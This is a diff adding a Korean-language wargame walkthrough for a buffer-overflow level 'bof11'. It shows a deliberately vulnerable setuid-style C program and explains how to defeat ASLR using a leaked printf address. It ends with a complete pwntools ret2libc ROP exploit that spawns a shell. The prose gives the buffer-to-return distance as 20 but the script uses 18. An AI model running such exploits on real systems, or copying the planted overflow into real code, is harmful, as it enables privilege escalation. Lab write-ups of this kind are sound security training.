@@ -93,3 +93,103 @@ while true; do ./bof10 `python -c "print 'x' * 20 + '\x51\x88\xa9\xff'"`; done
 
 <details>
 <summary>bof11</summary>
+
+```c
+// AFTER => bof10.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define BUF_SIZE 8
+
+// ASLR ON
+// STACK-PROTECTOR OFF
+// STACK-EXECUTION OFF
+
+void vuln(void) {
+    char buf[BUF_SIZE] = {'\0'};
+    memset(buf, 0, sizeof(buf));
+    printf("printf() address : %p\n", printf);
+
+    if (setreuid(1012, 1012)) {
+        perror("setuid");
+        exit(1);
+    }
+    if (setregid(1012, 1012)) {
+        perror("setgid");
+        exit(1);
+    }
+    unsigned short mistake = -128;
+    fgets(buf, mistake, stdin);
+    printf("Hello %s\n", buf);
+}
+
+int main(void) {
+    vuln();
+    return 0;
+}
+```
+</details>
+
+이 코드는 형식은 bof9와 유사하다. 하지만 다른점은 rslr이 걸려있다는 것이다. 다음코드를 통해서 확인할 수 있다.(그냥 bof11을 계속 실행 하면 주소값이 바뀌는 것을 확인할 수 있다.)
+
+```
+cat /proc/sys/kernel/randomize_va_space
+```
+
+bof9와 같이 스택에 쉘 실행권한이 없기 때문에 rtl을 사용하고 싶지만
+주소값이 바뀌는 상황에서 그 방법을 그대로 사용하기에는 어려움이 있다. 하지만 vuln 함수에서 보면 printf함수의 주소값이 유출되는 것을 확인 할 수있다. 이것을 통해서 rtl을 적용해 보자.
+
+우선 핵심은 bof10을 풀어보았을 때 buf부터 ret까지의 거리는 고정적으로 20이라는 것을 알 수 있었다. 이 말은 즉 스택에서 상대적인 거리는 변하지 않는 다는 것이다.
+
+그러므로 우리는 printf의 주소를 vuln함수 내에서 알아낼 수 있기때문에 printf함수의 주소값에 두 주소값의 상대적인 차이를 알아내어 더해준다면 실질적으로 우리가 원하는 주소값을 찾을 수 있을 것이다. 
+
+따라서 bo9에서 했던 방식으로 하기 위해서 우리가 필요한 함수들의 주소값을 찾아보자
+
+system와 printf의 상대 거리
+
+![](./image_bof11/sys-print.png)
+
+pop rdi ; ret과 printf의 상대 거리
+
+![](./image_bof11/1.png)
+![](./image_bof11/vmmap.png)
+![](./image_bof11/pop-print.png)
+
+/bin/sh과 printf의 상대거리
+
+![](./image_bof11/bin-print.png)
+
+buf부터 ret까지 거리
+
+![](./image_bof11/2.png)
+![](./image_bof11/3.png)
+![](./image_bof11/4.png)
+
+상대거리를 알아냈다하더라도 실행할때마다 printf의 주소값이 바뀌니 이 주소값이 바뀌지 않도록 붙들고 있어야지만 원하는 값을 buf에 입력할 수 있다.
+
+따라서 다음과 같은 poc코드를 작성할 수 있다.
+
+```py
+from pwn import *
+
+p = process('./bof11')
+
+#printf함수의 주소값을 printf에 저장한다.
+p.recvuntil('printf() address : ')
+printf = int(p.recvuntil('\n'), 16) #16 진수를 숫자로 바꿔준다.
+
+#알아낸 상대주소를 통해 실질적인 주소값을 알아낸다.
+sys = printf + (-66672)
+binsh = printf + (1275223)
+poprdi = printf + (-214782)
+bufToRet = 18
+
+#이를 통해 순서대로 페이로드를 만든다.
+payload = b"x" * bufToRet
+payload += p64(poprdi)
+payload += p64(binsh)
+payload += p64(sys)
+p.send(payload)
+
+p.interactive()
+```
